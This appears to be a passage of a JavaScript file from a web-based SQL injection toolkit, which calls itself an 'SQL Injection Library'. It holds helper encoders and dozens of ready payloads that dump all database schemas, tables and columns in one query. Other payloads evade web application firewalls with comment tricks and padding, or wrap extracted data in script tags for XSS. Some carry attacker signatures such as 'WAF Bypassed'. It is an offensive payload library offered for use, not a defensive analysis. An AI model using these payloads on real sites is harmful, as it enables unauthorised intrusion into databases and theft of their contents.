	out;

	len = str.length;
	i = 0;
	out = "";
	while (i < len) {
		/* c1 */
		do {
			c1 = base64DecodeChars[str.charCodeAt(i++) & 0xff];
		} while (i < len && c1 == -1);
		if (c1 == -1)
			break;

		/* c2 */
		do {
			c2 = base64DecodeChars[str.charCodeAt(i++) & 0xff];
		} while (i < len && c2 == -1);
		if (c2 == -1)
			break;

		out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

		/* c3 */
		do {
			c3 = str.charCodeAt(i++) & 0xff;
			if (c3 == 61)
				return out;
			c3 = base64DecodeChars[c3];
		} while (i < len && c3 == -1);
		if (c3 == -1)
			break;

		out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

		/* c4 */
		do {
			c4 = str.charCodeAt(i++) & 0xff;
			if (c4 == 61)
				return out;
			c4 = base64DecodeChars[c4];
		} while (i < len && c4 == -1);
		if (c4 == -1)
			break;
		out += String.fromCharCode(((c3 & 0x03) << 6) | c4);
	}
	return out;
}

function utf16to8(str) {
	var out,
	i,
	len,
	c;

	out = "";
	len = str.length;
	for (i = 0; i < len; i++) {
		c = str.charCodeAt(i);
		if ((c >= 0x0001) && (c <= 0x007F)) {
			out += str.charAt(i);
		} else if (c > 0x07FF) {
			out += String.fromCharCode(0xE0 | ((c >> 12) & 0x0F));
			out += String.fromCharCode(0x80 | ((c >>  6) & 0x3F));
			out += String.fromCharCode(0x80 | ((c >>  0) & 0x3F));
		} else {
			out += String.fromCharCode(0xC0 | ((c >>  6) & 0x1F));
			out += String.fromCharCode(0x80 | ((c >>  0) & 0x3F));
		}
	}
	return out;
}

function utf8to16(str) {
	var out,
	i,
	len,
	c;
	var char2,
	char3;

	out = "";
	len = str.length;
	i = 0;
	while (i < len) {
		c = str.charCodeAt(i++);
		switch (c >> 4) {
			case 0: case 1: case 2: case 3: case 4: case 5: case 6: case 7:
				// 0xxxxxxx
				out += str.charAt(i-1);
				break;
				case 12: case 13:
					// 110x xxxx   10xx xxxx
					char2 = str.charCodeAt(i++);
					out += String.fromCharCode(((c & 0x1F) << 6) | (char2 & 0x3F));
					break;
					case 14:
						// 1110 xxxx  10xx xxxx  10xx xxxx
						char2 = str.charCodeAt(i++);
						char3 = str.charCodeAt(i++);
						out += String.fromCharCode(((c & 0x0F) << 12) |
							((char2 & 0x3F) << 6) |
							((char3 & 0x3F) << 0));
						break;
			}
		}

				return out;
		}

				function CharToHex(str) {
					var out,
					i,
					len,
					c,
					h;

					out = "";
					len = str.length;
					i = 0;
					while (i < len) {
						c = str.charCodeAt(i++);
						h = c.toString(16);
						if (h.length < 2)
							h = "0" + h;

						out += "\\x" + h + " ";
						if (i > 0 && i % 8 == 0)
							out += "\r\n";
					}

					return out;
			}

				function b64_enc() {
					var str = document.getElementById('str').value;
					document.getElementById('hex').value = base64encode(utf16to8(str));
			}

			function b64_dec() {
				var str = document.getElementById('str').value;
				var opts = "checked";

				if (opts.checked) {
					document.getElementById('hex').value = CharToHex(base64decode(str));
				} else {
					document.getElementById('hex').value = utf8to16(base64decode(str));
				}
		}


		function d2h(d) {

			return d.toString(16);
		}

		function Str2Hex() {

			var tmp = document.getElementById('str').value;
			var str = '';
			for (var i = 0; i < tmp.length; i++) {
				c = tmp.charCodeAt(i);
				str += d2h(c) + '';
			}
			document.getElementById('hex').value = str;
		}

		function h2d(h) {

			return parseInt(h, 16);
		}

		function Hex2Str() {

			var string = document.getElementById('str').value;
			var string = string.toLowerCase();
			string = string.replace(/%/g, '');
			string = string.replace(/[^0-9abcdefg]/g, '');

			var charStringArray = new Array();
			var buffer = '';
			var hasil = '';
			for (var c = 0; c < string.length; c++) {
				buffer += string.charAt(c).toString();
				if (buffer.length >= 2) {
					hasil += String.fromCharCode(h2d(buffer));
					buffer = '';
				}
			}
			document.getElementById('hex').value = hasil;
		}


		function dios1() {
			var dios1 = '(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x)';
			document.getElementById('dios').value = dios1;
		}

		function dios2() {
			var dios2 = '(select(select+concat(@:=0xa7,(select+count(*)from(information_schema.coLumns )where(@:=concat(@,0x3c6c693e,table_name,0x203a3a20,column_name))),@)))';
			document.getElementById('dios').value = dios2;
		}

		function dios3() {
			var dios3 = 'make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)';
			document.getElementById('dios').value = dios3;
		}

		function dios4() {
			var dios4 = "export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0x203a3a20,2)),@,2)";
			document.getElementById('dios').value = dios4;
		}


		function xssdios() {
			var xssdios = 'concat(0x3c2f6469763e3c7363726970743e616c6572742827,(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat(@x,0x5c6e,table_name,0x203a3a20,column_name))))x),0x27293c2f7363726970743e)';
			document.getElementById('dios').value = xssdios;
		}

		function trjn() {
			var trjn = 'concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e,if((@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r+1,2,0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e),0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number+1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/';
			document.getElementById('dios').value = trjn;
		}

		function trjnx() {
			var trjnx = "concat(0x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e7e7472306a416e2a203a3a3c666f6e7420636f6c6f723d626c75653e20,version(),0x3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20,(select count(*) from information_schema.schemata),0x3c2f666f6e743e3c2f666f6e743e,0x202d2d203a2d20,concat(@sc:=0x00,@scc:=0x00,@r:=0,benchmark(@a:=(select count(*) from information_schema.schemata),@scc:=concat(@scc,0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d7265643e,LPAD(@r:=@r+1,3,0x30),0x2e20,(Select concat(0x3c623e,@sc:=schema_name,0x3c2f623e) from information_schema.schemata where schema_name>@sc order by schema_name limit 1),0x202028204e756d626572204f66205461626c657320496e204461746162617365203a3a20,(select count(*) from information_Schema.tables where table_schema=@sc),0x29,0x3c2f666f6e743e,0x202e2e2e20 ,@t:=0x00,@tt:=0x00,@tr:=0,benchmark((select count(*) from information_Schema.tables where table_schema=@sc),@tt:=concat(@tt,0x3c62723e,0x3c666f6e7420636f6c6f723d677265656e3e,LPAD(@tr:=@tr+1,3,0x30),0x2e20,(select concat(0x3c623e,@t:=table_name,0x3c2f623e) from information_Schema.tables where table_schema=@sc and table_name>@t order by table_name limit 1),0x203a20284e756d626572204f6620436f6c756d6e7320496e207461626c65203a3a20,(select count(*) from information_Schema.columns where table_name=@t),0x29,0x3c2f666f6e743e,0x202d2d3a20,@c:=0x00,@cc:=0x00,@cr:=0,benchmark((Select count(*) from information_schema.columns where table_schema=@sc and table_name=@t),@cc:=concat(@cc,0x3c62723e,0x3c666f6e7420636f6c6f723d707572706c653e,LPAD(@cr:=@cr+1,3,0x30),0x2e20,(Select (@c:=column_name) from information_schema.columns where table_schema=@sc and table_name=@t and column_name>@c order by column_name LIMIT 1),0x3c2f666f6e743e)),@cc,0x3c62723e)),@tt)),@scc),0x3c62723e3c62723e,0x3c62723e3c62723e)";
			document.getElementById('dios').value = trjnx;
		}

		function ebf() {
			var ebf = "(SELECT!x-~0.FROM(SELECT(concat_ws(0x3a3a,user(),@@version,database(),concat(@:=0,(Select+count(*)from+information_schema.tables+where+table_schema=database()and@:=concat(@,0x0b,table_name)),@)))x)a)";
			document.getElementById('dios').value = ebf;
		}

		function poligon() {
			var poligon = "polygon((Select*from((SELECT(!x-~0)FROM(SELECT(concat_ws(0x203a3a20,user(),@@version,database(),(Select+group_concat(table_name+separator+0x0b)from+information_schema.tables+where+table_schema=database())))x)a)b)))";
			document.getElementById('dios').value = poligon;
		}



		function postgre() {
			var postgre = "(select+string_agg(concat(table_name,'::',column_name),$$<li>$$)from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$))";
			document.getElementById('dios').value = postgre;
		}

		function mssql() {
			var mssql = "(select+concat('',table_name,'::',column_name)from+information_schema.columns+for+xml+path(''))";
			document.getElementById('dios').value = mssql;
		}

		function bof() {
			var bof = "+and(SELECT+1)=(SELECT+0x41414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141)/*!50000UNION*/SELECT+";
			document.getElementById('dios').value = bof;

		}

		function version1() {
			var v1 = 'version()';
			document.getElementById('dios').value = v1;
		}

		function version2() {
			var v2 = '@@version';
			document.getElementById('dios').value = v2;
		}

		function version3() {
			var v3 = '@@GLOBAL.VERSION';
			document.getElementById('dios').value = v3;
		}

		function version4() {
			var v4 = "(select+variable_value+from+information_schema.session_variables+where+variable_name+like+0x56455253494f4e)";
			document.getElementById('dios').value = v4;
		}

		function version5() {
			var v5 = "(Select+variable_value+from+information_schema.global_variables+where+variable_name=0x76657273696f6e)";
			document.getElementById('dios').value = v5;
		}

		function user1() {
			var u1 = 'user()';
			document.getElementById('dios').value = u1;
		}

		function user2() {
			var u2 = 'CURRENT_USER()';
			document.getElementById('dios').value = u2;
		}

		function user3() {
			var u3 = 'SYSTEM_USER()';
			document.getElementById('dios').value = u3;
		}

		function user4() {
			var u4 = 'SESSION_USER()';
			document.getElementById('dios').value = u4;
		}

		function user5() {
			var u5 = 'SUBSTRING_INDEX(USER(),0x40,1)';
			document.getElementById('dios').value = u5;
		}

		function user6() {
			var u6 = '(SELECT+CONCAT(USER)+FROM+INFORMATION_SCHEMA.PROCESSLIST)';
			document.getElementById('dios').value = u6;
		}

		function db1() {
			var d1 = 'DATABASE()';
			document.getElementById('dios').value = d1;
		}

		function db2() {
			var d2 = 'SCHEMA()';
			document.getElementById('dios').value = d2;
		}

		function db3() {
			var d3 = '(SELECT+CONCAT(DB)+FROM+INFORMATION_SCHEMA.PROCESSLIST)';
			document.getElementById('dios').value = d3;
		}

		function o1() {
			var o1 = '@@HOSTNAME';
			document.getElementById('dios').value = o1;
		}

		function o2() {
			var o2 = '@@VERSION_COMPILE_MACHINE';
			document.getElementById('dios').value = o2;
		}

		function o3() {
			var o3 = '@@VERSION_COMPILE_OS';
			document.getElementById('dios').value = o3;
		}

		function o4() {
			var o4 = '@@BASEDIR';
			document.getElementById('dios').value = o4;
		}

		function o5() {
			var o5 = '@@HAVE_OPENSSL';
			document.getElementById('dios').value = o5;
		}

		function o6() {
			var o6 = '@@HAVE_SYMLINK';
			document.getElementById('dios').value = o6;
		}

		function o7() {
			var o7 = '@@PORT';
			document.getElementById('dios').value = o7;
		}

		function o8() {
			var o8 = '@@SOCKET';
			document.getElementById('dios').value = o8;
		}

		function xssqli() {
			var xssqli = prompt('Input Your Query', 'VERSION()');
			
			// Swal.mixin({
   //     input: 'text',
   //     confirmButtonText: 'Okay!',
   //     showCancelButton: true,
   //   }).queue([
   //     {
   //       title: 'Question 1',
   //       text: 'Chaining swal2 modals is easy'
   //     }
   //   ]).then((result) => {
   //     if (result.value) {
   //       Swal.fire({
   //         title: 'All done!',
   //         html:
   //           'Your answers: <pre><code>' +
   //             JSON.stringify(result.value) +
   //           '</code></pre>',
   //         confirmButtonText: 'Lovely!'
   //       })
   //     }
   //   })
			
			var xssqli = "concat(0x3c2f6469763e3c7363726970743e616c6572742827,"+xssqli+",0x27293c2f7363726970743e)";
			document.getElementById('dios').value = xssqli;
		}

		function mydios() {
			var mydios = "concat(0x3c2f6469763e3c7363726970743e616c6572742827,0x496e6a6563746564204279202e2f4d722e70336d7531345c6e5c6e,VERSION(),0x205b20,@@VERSION_COMPILE_OS,0x205d5c6e,0x55736572203e3e20,USER(),0x5c6e,0x44426e616d65203e3e20,DATABASE(),0x5c6e5c6e,concat(0x546f74616c20446174616261736573205b20,(select+count(*)from+information_schema.schemata)),0x205d5c6e,concat(0x546f74616c205461626c6573205b20,(select+count(*)from+information_schema.tables+where+table_Schema=database())),0x205d5c6e,concat(0x546f74616c20436f6c756d6e73205b20,(select+count(*)from+information_schema.columns+where+table_Schema=database())),0x205d5c6e,(select(@x)from(select(@x:=0x00),(@num:=0),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat(@x,0x5c6e,LPAD(@num:=@num+1,3,0x30),0x2e20,table_name,0x203a3a20,column_name))))x),0x27293c2f7363726970743e)";
			document.getElementById('dios').value = mydios;
		}

		function mydios2() {
			var mydios2 = "concat(0x496e6a6563746564204279202e2f4d722e70336d7531343c62723e,VERSION(),0x205b20,@@VERSION_COMPILE_OS,0x205d3c62723e,0x55736572203e3e20,USER(),0x3c62723e,0x44426e616d65203e3e20,DATABASE(),0x3c62723e,concat(0x546f74616c20446174616261736573205b20,(select+count(*)from+information_schema.schemata)),0x205d3c62723e,concat(0x546f74616c205461626c6573205b20,(select+count(*)from+information_schema.tables+where+table_Schema=database())),0x205d3c62723e,concat(0x546f74616c20436f6c756d6e73205b20,(select+count(*)from+information_schema.columns+where+table_Schema=database())),0x205d3c62723e,(select(@x)from(select(@x:=0x00),(@num:=0),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat(@x,0x3c62723e,LPAD(@num:=@num+1,3,0x30),0x2e20,table_name,0x203a3a20,column_name))))x))";
			document.getElementById('dios').value = mydios2;
		}

		function hx() {
			var hx = prompt('Input Your Query', 'VERSION()');
			var hx = "hex(unhex("+hx+"))";
			document.getElementById('dios').value = hx;
		}

		function cn() {
			var cn = prompt('Input Your Query', 'VERSION()');
			var cn = "convert("+cn+"+using+latin1)";
			document.getElementById('dios').value = cn;
		}

		function cs() {
			var cs = prompt('Input Your Query', 'VERSION()');
			var cs = "cast("+cs+"+as+char)";
			document.getElementById('dios').value = cs;
		}

		function cp() {
			var cp = prompt('Input Your Query', 'VERSION()');
			var cp = "uncompress(compress("+cp+")) ";
			document.getElementById('dios').value = cp;
		}

		function aes() {
			var aes = prompt('Input Your Query', 'VERSION()');
			var aes = "aes_decrypt(aes_encrypt("+aes+",1),1)";
			document.getElementById('dios').value = aes;
		}

		function tblc() {
			var tblc = swal.fire(
				'Info',
				'Count Total Tables with Table Name',
				'info'
			);
			var tblc = "concat(@c:=0x00,if((select+count(*)+from(information_schema.tables)where+table_schema=database()+and+@c:=concat(@c,0x3c6c693e,@tbl:=table_name,0x203a3a20,(select+count(*)from+information_schema.columns+where+table_Schema=database()+and+table_name=@tbl))),0x00,0x00),@c)";
			document.getElementById('dios').value = tblc;
		}

		function dbc() {
			var dbc = swal.fire(
				'Info',
				'Count Total Databases',
				'info'
			);
			var dbc = "concat(0x546f74616c20446174616261736573203e3e20,(select+count(*)from+information_schema.schemata))";
			document.getElementById('dios').value = dbc;
		}

		function tottbl() {
			var tottbl = swal.fire(
				'Info',
				'Count Total Tables',
				'info'
			);
			var tottbl = "concat(0x546f74616c205461626c6573203e3e20,(select+count(*)from+information_schema.tables+where+table_Schema=database()))";
			document.getElementById('dios').value = tottbl;
		}

		function totcol() {
			var totcol = swal.fire(
				'Info',
				'Count Total Columns',
				'info'
			);
			var totcol = "concat(0x546f74616c20436f6c756d6e73203e3e20,(select+count(*)from+information_schema.columns+where+table_Schema=database()))";
			document.getElementById('dios').value = totcol;
		}

		function countdb() {
			var countdb = Swal.fire(
				"info",
				"Count Total Databases with Database Name",
				"info"
			);
			var countdb = "(SELECT+(@x)+FROM+(SELECT+(@x:=0x00),(@NR_DB:=0),(SELECT+(0)+FROM+(INFORMATION_SCHEMA.SCHEMATA)+WHERE+(@x)+IN+(@x:=CONCAT(@x,LPAD(@NR_DB:=@NR_DB+1,2,0x30),0x20203a2020,schema_name,0x3c62723e))))x)"; document.getElementById('dios').value = countdb;
		}


		function union1() {
			var union1 = '+AND+0+/*!50000UniON+SeLeCt*/+';
			document.getElementById('dios').value = union1;
		}
		function union2() {
			var union2 = '+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+';
			document.getElementById('dios').value = union2;
		}
		function union3() {
			var union3 = '+AND+0+UNION/**/DISTINCTROW+SELECT+11111';
			document.getElementById('dios').value = union3;
		}
		function union4() {
			var union4 = '+/*!00000UnIoN*/+/*!00000SeLeCt*/+';
			document.getElementById('dios').value = union4;
		}
		function union5() {
			var union5 = '+or .0union/**/distinctrow%23GearFourthBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB%0aselect/**/distinctrow+';
			document.getElementById('dios').value = union5;
		}
		function union6() {
			var union6 = '+And .0union/**/distinctrow%23GearFourthBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB%0aselect/**/distinctrow+';
			document.getElementById('dios').value = union6;
		}

		function order1() {
			var order1 = '+ORDER+BY+100+ASC--';
			document.getElementById('dios').value = order1;
		}
		function order2() {
			var order1 = '+GROUP+BY+1+ASC--+-';
			document.getElementById('dios').value = order1;
		}
		function userr() {
			var order1 = '/*!50000user/**_**/*/()';
			document.getElementById('dios').value = order1;
		}
		function dtba() {
			var order1 = 'database/**_**/()';
			document.getElementById('dios').value = order1;
		}
		function ver() {
			var order1 = 'version/**8**/()';
			document.getElementById('dios').value = order1;
		}
		function about() {
			Swal.fire(
				'About',
				'SQL Injection Library from SocialIndo Tools',
				'info'
			);
		}